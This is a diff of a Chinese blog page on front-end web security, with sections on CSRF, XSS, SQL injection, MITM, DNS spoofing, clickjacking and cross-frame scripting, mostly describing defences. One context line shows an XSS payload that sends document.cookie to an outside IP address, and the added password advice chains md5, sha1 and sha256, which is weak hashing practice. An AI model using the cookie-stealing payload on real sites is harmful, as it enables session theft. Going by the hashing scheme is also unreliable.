@@ -6,7 +6,7 @@
 
 
 <html class="theme-next muse use-motion" lang="zh-CN">
-<head><meta name="generator" content="Hexo 3.8.0">
+<head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -79,22 +79,22 @@
 
 
 
-<meta name="description" content="CSRF 跨站点请求伪造(Cross Site Request Forgery)XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。 CSRF可以这样理解，攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的。比如以你">
+<meta name="description" content="CSRF 跨站点请求伪造(Cross Site Request Forgery)XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。 XSS 是获取信息，不需要提前知道其他⽤户⻚⾯的代码和数据包。 CSRF 是代替⽤户完成 指定的动作，需要知道">
 <meta name="keywords" content="basic">
 <meta property="og:type" content="article">
 <meta property="og:title" content="前端安全">
 <meta property="og:url" content="http://yoursite.com/2019/05/11/网络/前端安全/index.html">
 <meta property="og:site_name" content="404 not found">
-<meta property="og:description" content="CSRF 跨站点请求伪造(Cross Site Request Forgery)XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。 CSRF可以这样理解，攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的。比如以你">
+<meta property="og:description" content="CSRF 跨站点请求伪造(Cross Site Request Forgery)XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。 XSS 是获取信息，不需要提前知道其他⽤户⻚⾯的代码和数据包。 CSRF 是代替⽤户完成 指定的动作，需要知道">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://leslie-blog.oss-cn-hongkong.aliyuncs.com/leslie_choi_blog/mitm.png">
 <meta property="og:image" content="https://leslie-blog.oss-cn-hongkong.aliyuncs.com/leslie_choi_blog/iframe1.png">
 <meta property="og:image" content="https://leslie-blog.oss-cn-hongkong.aliyuncs.com/leslie_choi_blog/iframe2.png">
 <meta property="og:image" content="https://leslie-blog.oss-cn-hongkong.aliyuncs.com/leslie_choi_blog/iframe3.png">
-<meta property="og:updated_time" content="2019-11-29T09:17:39.957Z">
+<meta property="og:updated_time" content="2019-12-01T15:25:59.746Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="前端安全">
-<meta name="twitter:description" content="CSRF 跨站点请求伪造(Cross Site Request Forgery)XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。 CSRF可以这样理解，攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的。比如以你">
+<meta name="twitter:description" content="CSRF 跨站点请求伪造(Cross Site Request Forgery)XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。 XSS 是获取信息，不需要提前知道其他⽤户⻚⾯的代码和数据包。 CSRF 是代替⽤户完成 指定的动作，需要知道">
 <meta name="twitter:image" content="https://leslie-blog.oss-cn-hongkong.aliyuncs.com/leslie_choi_blog/mitm.png">
 
 
@@ -143,7 +143,7 @@
 
 </head>
 
-<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
 
   
   
@@ -153,7 +153,7 @@
   <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
-    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-wrapper">
   <div class="site-meta ">
     
@@ -233,20 +233,20 @@
   
   
 
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
   
   
   
   <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/11/网络/前端安全/">
 
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="leslie choi">
-      <meta itemprop="description" content="">
+      <meta itemprop="description" content>
       <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="404 not found">
     </span>
 
@@ -289,7 +289,7 @@
                 <span class="post-meta-item-text">In</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                   <a href="/categories/network/" itemprop="url" rel="index">
                     <span itemprop="name">network</span>
                   </a>
@@ -328,6 +328,7 @@
 
       
         <h1 id="CSRF-跨站点请求伪造-Cross-Site-Request-Forgery"><a href="#CSRF-跨站点请求伪造-Cross-Site-Request-Forgery" class="headerlink" title="CSRF 跨站点请求伪造(Cross Site Request Forgery)"></a>CSRF 跨站点请求伪造(Cross Site Request Forgery)</h1><p>XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。</p>
+<p>XSS 是获取信息，不需要提前知道其他⽤户⻚⾯的代码和数据包。 CSRF 是代替⽤户完成 指定的动作，需要知道其他⽤户⻚⾯的代码和数据包。</p>
 <p>CSRF可以这样理解，攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的。比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等等。</p>
 <p>要完成一次CSRF攻击，受害者必须依次完成两个步骤：</p>
 <ul>
@@ -368,11 +369,12 @@
 <li>攻击者提交恶意代码 </li>
 <li>浏览器执行恶意代码</li>
 </ol>
-<h3 id="输入过滤"><a href="#输入过滤" class="headerlink" title="输入过滤"></a>输入过滤</h3><p>通过“防止浏览器执行恶意代码”来防范 XSS。这部分分为两类： </p>
+<h3 id="输入过滤"><a href="#输入过滤" class="headerlink" title="输入过滤"></a>输入过滤</h3><p>通过“防止浏览器执行恶意代码”来防范 XSS。这部分分为两类：</p>
 <ol>
 <li>防止HTML中出现注入 </li>
-<li>对HTML做充分转义。</li>
+<li>对HTML做充分转义，对于引号、尖括号、斜杠进⾏转义。</li>
 </ol>
+<p>PS：但是对于显示富⽂本来说，显然不能通过上⾯的办法来转义所有字符，因为这 样会把需要的格式也过滤掉。对于这种情况，通常采⽤⽩名单过滤的办法，当 然也可以通过⿊名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使⽤⽩名单的⽅式。</p>
 <h3 id="预防存储型和反射型-XSS-攻击"><a href="#预防存储型和反射型-XSS-攻击" class="headerlink" title="预防存储型和反射型 XSS 攻击"></a>预防存储型和反射型 XSS 攻击</h3><p>存储型和反射型 XSS 都是在服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。 预防这两种漏洞，有两种常见做法：</p>
 <p><strong>改成纯前端渲染，把代码和数据分隔开</strong></p>
 <ol>
@@ -387,7 +389,7 @@
 <h3 id="预防-DOM-型-XSS-攻击"><a href="#预防-DOM-型-XSS-攻击" class="headerlink" title="预防 DOM 型 XSS 攻击"></a>预防 DOM 型 XSS 攻击</h3><p>DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。</p>
 <p>所以在使用 <strong>.innerHTML、.outerHTML、document.write() </strong>时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute() 等。</p>
 <h3 id="其他XSS防范措施"><a href="#其他XSS防范措施" class="headerlink" title="其他XSS防范措施"></a>其他XSS防范措施</h3><ol>
-<li>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。</li>
+<li>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。（比如反射型xss无法直接获取cookie）</li>
 <li>验证码：防止脚本冒充用户提交危险操作。</li>
 <li>对于不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止 XSS 发生，但可以增加 XSS 攻击的难度。</li>
 <li>Content Security Policy: csp的本质上就是建立一个白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。</li>
@@ -423,6 +425,18 @@
 <h1 id="cookie诈骗"><a href="#cookie诈骗" class="headerlink" title="cookie诈骗"></a>cookie诈骗</h1><p>在 XSS 攻击中，黑客可以构造语句来成功获取用户的cookie信息</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script&gt;<span class="built_in">window</span>.open(<span class="string">'http://10.65.21.78:8080/ck.php?c='</span>+<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
 <p>然后通过提取 cookie 中的 key 和 value 值，利用插件拷贝到浏览器中，那么便很容易黑进人家网站后台了。可以设置 HttpOnly 提高安全性，但是也并不是万能的。也可能在 socket 层面通过抓包获取重要信息</p>
+<p>对于cookie，我们还必须要注意其安全性</p>
+<ol>
+<li>value ：如果⽤于保存⽤户登录态，应该将该值加密，不能使⽤明⽂的⽤户标识</li>
+<li>http-only 不能通过 JS 访问 Cookie ，减少 XSS 攻击</li>
+<li>secure 只能在协议为 HTTPS 的请求中携带</li>
+<li>same-site 规定浏览器不能在跨域请求中携带 Cookie ，减少 CSRF 攻击</li>
+</ol>
+<h1 id="密码安全"><a href="#密码安全" class="headerlink" title="密码安全"></a>密码安全</h1><p>对于密码存储来说，必然是不能明⽂存储在数据库中的，否则⼀旦数据库泄 露，会对⽤户造成很⼤的损失。并且不建议只对密码单纯通过加密算法加密，因为存在彩虹表的关系。</p>
+<p>通常需要对密码加盐，然后进⾏⼏次不同加密算法的加密</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 加盐也就是给原密码添加字符串，增加原密码⻓度 </span></span><br><span class="line">sha256(sha1(md5(salt + password + salt)))</span><br></pre></td></tr></table></figure>
+<p>但是加盐并不能阻⽌别⼈盗取账号，只能确保即使数据库泄露，也不会暴露⽤ 户的真实密码。⼀旦攻击者得到了⽤户的账号，可以通过暴⼒破解的⽅式破解 密码。对于这种情况，通常使⽤验证码增加延时或者限制尝试次数的⽅式。且⼀旦⽤户输⼊了错误的密码，也不能直接提示⽤户输错密码，⽽应该提示账号或密码错误。</p>
+<p>虽然前端加密对于安全防护来说意义不⼤，但是在遇到中间⼈攻击的情况下， 可以避免明⽂密码被第三⽅获取。</p>
 <h1 id="中间人攻击（MITM）"><a href="#中间人攻击（MITM）" class="headerlink" title="中间人攻击（MITM）"></a>中间人攻击（MITM）</h1><p>中间人攻击(man-in-the-middle attack, abbreviated to MITM)，简单的讲，就是黑客悄悄的躲在通信双方之间，窃听甚至篡改通信信息。而通信双方并不知道消息已经被截获甚至篡改了。</p>
 <p>很多的时候，我们的网站不是直接就访问到我们的服务器上的，中间会经过很多层代理，如果在某一个环节，数据被中间代理层的劫持者所截获，他们就能获取到使用你网站的用户的密码等保密数据。比如，我们的用户经常会在各种饭馆里面，连一些奇奇怪怪的wifi，如果这个wifi是黑客所建立的热点wifi，那么黑客就可以结果该用户收发的所有数据。</p>
 <p>举个例子，小明用微信发一条消息给小红，这条消息会从小明的手机发送到微信的服务器，再由微信服务器转发给小红，理论上讲，微信服务器是可以查看或者修改小明发送的信息的。这个时候，微信服务器就可以是实施攻击的中间人。</p>
@@ -434,6 +448,16 @@
 <li>客户端程序禁止了显示证书错误警告信息</li>
 <li>攻击者已控制客户端，强制信任伪造证书</li>
 </ul>
+<h2 id="DNS欺骗"><a href="#DNS欺骗" class="headerlink" title="DNS欺骗"></a>DNS欺骗</h2><p>DNS协议即域名解析协议，简单的说：DNS是用来解析域名的。有了DNS我们就不用再记住烦人的IP地址，用相对好记的域名就可以对服务器进行访问，即使服务器更换了IP地址，我们依旧可以通过域名访问该服务器，这样能够使我们更方便的访问互联网。</p>
+<p>DNS欺骗即域名信息欺骗是最常见的DNS安全问题。当一个DNS服务器掉入陷阱，使用了来自一个恶意DNS服务器的错误信息，那么该DNS服务器就被欺骗了。欺骗后便会为客户机器提供错误的IP地址指向，例如你打开百度的网址却成了另外的一个未知网页，后果也是挺严重的。</p>
+<p>DNS欺骗就是利用了DNS协议设计时的一个非常严重的安全缺陷。</p>
+<p>首先欺骗者向目标机器发送构造好的ARP应答数据包(ARP协议就是用来把IP地址转换为MAC地址的)，ARP欺骗成功后，嗅探到对方发出的DNS请求数据包，分析数据包取得ID和端口号后，向目标发送自己构造好的一个DNS返回包，对方收到DNS应答包后，发现ID和端口号全部正确，即把返回数据包中的域名和对应的IP地址保存进DNS缓存表中，而后来的当真实的DNS应答包返回时则被丢弃。</p>
+<p>DNS欺骗是很难进行有效防御的，因为大多情况下都是被攻击之后才会发现.</p>
+<p>DNS欺骗的防范：</p>
+<ol>
+<li>因为DNS欺骗前提也需要ARP欺骗成功。所以首先做好对ARP欺骗攻击的防范</li>
+<li>使用安全检测软件定期检查系统是否遭受攻击</li>
+</ol>
 <h2 id="防止中间人攻击"><a href="#防止中间人攻击" class="headerlink" title="防止中间人攻击"></a>防止中间人攻击</h2><ol>
 <li><p>最有效的防攻击手段就是一次性密码(One Time Password)，由信息论发明人香农提出，理论上讲是绝对安全的。但是一次性密码也有个前提，那就是安全的把密码传达给对方。(但是经过网络传输并不能保证绝对安全)</p>
 </li>
@@ -451,6 +475,22 @@
 <p>当你点击按钮以后，真正的点击的其实是隐藏的那个页面的订阅按钮，然后就会在你不知情的情况下订阅了</p>
 <p><img src="https://leslie-blog.oss-cn-hongkong.aliyuncs.com/leslie_choi_blog/iframe3.png" alt="markdown"></p>
 <p>当然点击劫持的危害可大可小，并不仅仅是关注订阅之类的东西，但是原理类似</p>
+<p>防御方法：</p>
+<ol>
+<li>X-FRAME-OPTIONS</li>
+</ol>
+<p>X-FRAME-OPTIONS 是⼀个 HTTP 响应头，在现代浏览器有⼀个很好的⽀ 持。这个 HTTP 响应头 就是为了防御⽤ iframe 嵌套的点击劫持攻击。</p>
+<ul>
+<li>DENY ，表示⻚⾯不允许通过 iframe 的⽅式展示 </li>
+<li>SAMEORIGIN ，表示⻚⾯可以在相同域名下通过 iframe 的⽅式展示 </li>
+<li>ALLOW-FROM ，表示⻚⾯可以在指定来源的 iframe 中展示</li>
+</ul>
+<ol start="2">
+<li>使用JS防御</li>
+</ol>
+<p>对于某些远古浏览器来说，并不能⽀持上⾯的这种⽅式，那我们只有通过 JS 的⽅式来防御点击劫持了。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">style</span> <span class="attr">id</span>=<span class="string">"click-jack"</span>&gt;</span></span><br><span class="line">        html &#123;</span><br><span class="line">                 display: none !important;</span><br><span class="line">              &#125;   </span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>   </span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>     </span><br><span class="line">    if (self == top) &#123;</span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> style = <span class="built_in">document</span>.getElementById(<span class="string">'click-jack'</span>)</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.body.removeChild(style)     </span></span><br><span class="line"><span class="javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line">      top.location = self.location</span><br><span class="line">    &#125;   </span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当通过 iframe 的⽅式加载⻚⾯时，攻击者的⽹⻚直接不显示所有内容了。</p>
 <h1 id="HTML5安全"><a href="#HTML5安全" class="headerlink" title="HTML5安全"></a>HTML5安全</h1><p>html5定义了很多新标签、新事件，这有可能带来新的xss攻击。</p>
 <ol>
 <li><code>&lt;video&gt;</code></li>
@@ -478,7 +518,7 @@
 <ol start="3">
 <li>Link Type :noreferrer</li>
 </ol>
-<p>在HTML5中为<a>标签和<area>标签定义了一个新的Link Type :noreferrer ，指定noreferrer后，浏览器在请求该标签指定的地址时将不再发送referer。</a></p>
+<p>在HTML5中为<code>&lt;a&gt;</code>标签和<code>&lt;area&gt;</code>标签定义了一个新的Link Type :noreferrer ，指定noreferrer后，浏览器在请求该标签指定的地址时将不再发送referer。</p>
 <p><code>&lt;a href=&quot;xxx&quot; rel=&quot;noreferrer&quot;&gt; teat &lt;/a&gt;</code></p>
 <p>这种设计是出于保护敏感信息和隐私的考虑。因为referer，可能会泄露一些敏感的信息。</p>
 <p>这个标签需要开发者手动添加到页面的标签中，对于有需求的标签可以选择使用noreferrer。</p>
@@ -499,9 +539,32 @@
 <ol start="4">
 <li>Canvas的妙用</li>
 </ol>
-<p>这个标签可以说是HTML5中最大的创新之一。<img>标签只能是远程加载一张图片，而<canvas> 标签让Javascript可以在页面中直接操作图片对象，也可以直接操作像素，构造出图片区域。</canvas></p>
+<p>这个标签可以说是HTML5中最大的创新之一。<code>&lt;img&gt;</code>标签只能是远程加载一张图片，而<code>&lt;canvas&gt;</code> 标签让Javascript可以在页面中直接操作图片对象，也可以直接操作像素，构造出图片区域。</p>
 <p>canvas提供的强大的功能，甚至可以用来破解验证码。Shaun Friedle写了一个脚本，通过JS操作Canvas中的每个像素点，成功的自动化识别了验证码。</p>
-<h1 id="DNS欺骗"><a href="#DNS欺骗" class="headerlink" title="DNS欺骗"></a>DNS欺骗</h1><h1 id="iframe攻击"><a href="#iframe攻击" class="headerlink" title="iframe攻击"></a>iframe攻击</h1><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_32523587/article/details/79613768" target="_blank" rel="noopener">web安全之点击劫持(clickjacking)</a></p>
+<h1 id="CFS攻击-跨框架脚本攻击"><a href="#CFS攻击-跨框架脚本攻击" class="headerlink" title="CFS攻击(跨框架脚本攻击)"></a>CFS攻击(跨框架脚本攻击)</h1><p>Cross Frame Script 利用浏览器允许框架(frame)跨站包含其它页面的漏洞，在主框架的代码中加入scirpt，监视、盗取用户输入。</p>
+<p>CFS 和 点击劫持其实都是基于网页iframe产生的攻击。当没有预防的时候，攻击者可以利用iframe的方式包含你的网页，<br>采用欺骗的方式，引导用户过来点击，利用监听盗取用户输入信息或者是利用样式控制或者骗取用户点击某个特定的区域，而达到<br>获取劫持的目的。</p>
+<p>防范措施：</p>
+<ol>
+<li>meta 标签：很多时候没有效果</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Windows-Target"</span> <span class="attr">contect</span>=<span class="string">"_top"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>js 判断顶层窗口跳转，可轻易破解</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">locationTop</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (top.location != self.location) &#123;</span><br><span class="line">        top.location = self.location;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;       </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">locationTop()</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>header 控制，绝大部分浏览器支持</li>
+</ol>
+<p>使用 X-Frame-Options 有三个可选的值：</p>
+<ul>
+<li><p>DENY：浏览器拒绝当前页面加载任何Frame页面</p>
+</li>
+<li><p>SAMEORIGIN：frame页面的地址只能为同源域名下的页面</p>
+</li>
+<li><p>ALLOW-FROM：允许frame加载的页面地址</p>
+</li>
+</ul>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_32523587/article/details/79613768" target="_blank" rel="noopener">web安全之点击劫持(clickjacking)</a><br><a href="https://blog.csdn.net/zp522123428/article/details/42295031" target="_blank" rel="noopener">基于iframe的CFS(Cross Frame Script)和Clickjacking(点击劫持)攻击</a></p>
 
       
     </div>
@@ -608,7 +671,7 @@
 
       <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
               <p class="site-author-name" itemprop="name">leslie choi</p>
               <p class="site-description motion-element" itemprop="description"></p>
@@ -676,7 +739,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CSRF-跨站点请求伪造-Cross-Site-Request-Forgery"><span class="nav-number">1.</span> <span class="nav-text">CSRF 跨站点请求伪造(Cross Site Request Forgery)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF防御：防御主要着手于服务端效果更好"><span class="nav-number">1.1.</span> <span class="nav-text">CSRF防御：防御主要着手于服务端效果更好</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SameSite"><span class="nav-number">1.1.1.</span> <span class="nav-text">SameSite</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#验证码"><span class="nav-number">1.1.2.</span> <span class="nav-text">验证码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#验证-HTTP-Referer"><span class="nav-number">1.1.3.</span> <span class="nav-text">验证 HTTP Referer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#请求地址中添加-token-并验证"><span class="nav-number">1.1.4.</span> <span class="nav-text">请求地址中添加 token 并验证</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS攻击"><span class="nav-number">2.</span> <span class="nav-text">XSS攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#存储型-XSS-的攻击步骤："><span class="nav-number">2.1.</span> <span class="nav-text">存储型 XSS 的攻击步骤：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反射型-XSS-的攻击步骤："><span class="nav-number">2.2.</span> <span class="nav-text">反射型 XSS 的攻击步骤：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM-型-XSS-："><span class="nav-number">2.3.</span> <span class="nav-text">DOM 型 XSS ：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS攻击的预防"><span class="nav-number">2.4.</span> <span class="nav-text">XSS攻击的预防</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#输入过滤"><span class="nav-number">2.4.1.</span> <span class="nav-text">输入过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#预防存储型和反射型-XSS-攻击"><span class="nav-number">2.4.2.</span> <span class="nav-text">预防存储型和反射型 XSS 攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#预防-DOM-型-XSS-攻击"><span class="nav-number">2.4.3.</span> <span class="nav-text">预防 DOM 型 XSS 攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他XSS防范措施"><span class="nav-number">2.4.4.</span> <span class="nav-text">其他XSS防范措施</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入"><span class="nav-number">3.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#可能造成的危害"><span class="nav-number">3.1.</span> <span class="nav-text">可能造成的危害</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#对SQL注入的防御方法主要有"><span class="nav-number">3.2.</span> <span class="nav-text">对SQL注入的防御方法主要有</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cookie诈骗"><span class="nav-number">4.</span> <span class="nav-text">cookie诈骗</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#中间人攻击（MITM）"><span class="nav-number">5.</span> <span class="nav-text">中间人攻击（MITM）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SSL伪造CA证书实现中间人攻击"><span class="nav-number">5.1.</span> <span class="nav-text">SSL伪造CA证书实现中间人攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防止中间人攻击"><span class="nav-number">5.2.</span> <span class="nav-text">防止中间人攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#点击劫持"><span class="nav-number">6.</span> <span class="nav-text">点击劫持</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HTML5安全"><span class="nav-number">7.</span> <span class="nav-text">HTML5安全</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DNS欺骗"><span class="nav-number">8.</span> <span class="nav-text">DNS欺骗</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#iframe攻击"><span class="nav-number">9.</span> <span class="nav-text">iframe攻击</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考文章"><span class="nav-number">10.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CSRF-跨站点请求伪造-Cross-Site-Request-Forgery"><span class="nav-number">1.</span> <span class="nav-text">CSRF 跨站点请求伪造(Cross Site Request Forgery)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF防御：防御主要着手于服务端效果更好"><span class="nav-number">1.1.</span> <span class="nav-text">CSRF防御：防御主要着手于服务端效果更好</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SameSite"><span class="nav-number">1.1.1.</span> <span class="nav-text">SameSite</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#验证码"><span class="nav-number">1.1.2.</span> <span class="nav-text">验证码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#验证-HTTP-Referer"><span class="nav-number">1.1.3.</span> <span class="nav-text">验证 HTTP Referer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#请求地址中添加-token-并验证"><span class="nav-number">1.1.4.</span> <span class="nav-text">请求地址中添加 token 并验证</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS攻击"><span class="nav-number">2.</span> <span class="nav-text">XSS攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#存储型-XSS-的攻击步骤："><span class="nav-number">2.1.</span> <span class="nav-text">存储型 XSS 的攻击步骤：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反射型-XSS-的攻击步骤："><span class="nav-number">2.2.</span> <span class="nav-text">反射型 XSS 的攻击步骤：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM-型-XSS-："><span class="nav-number">2.3.</span> <span class="nav-text">DOM 型 XSS ：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS攻击的预防"><span class="nav-number">2.4.</span> <span class="nav-text">XSS攻击的预防</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#输入过滤"><span class="nav-number">2.4.1.</span> <span class="nav-text">输入过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#预防存储型和反射型-XSS-攻击"><span class="nav-number">2.4.2.</span> <span class="nav-text">预防存储型和反射型 XSS 攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#预防-DOM-型-XSS-攻击"><span 